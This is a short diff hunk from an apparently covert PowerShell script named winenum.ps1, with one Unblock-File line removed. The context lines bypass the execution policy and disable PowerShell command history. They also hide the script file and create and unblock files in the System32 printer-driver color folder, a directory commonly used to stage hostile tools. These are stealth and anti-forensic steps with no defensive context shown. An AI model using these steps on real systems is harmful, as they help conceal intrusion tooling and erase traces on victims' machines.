@@ -8,7 +8,6 @@ cd $color
 Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 attrib +h winenum.ps1
-Unblock-File -Path "C:\Windows\System32\spool\drivers\color\winenum.ps1"
 New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\1.txt"
 Unblock-File -Path C:\Windows\System32\spool\drivers\color\1.txt
 New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\2.txt"
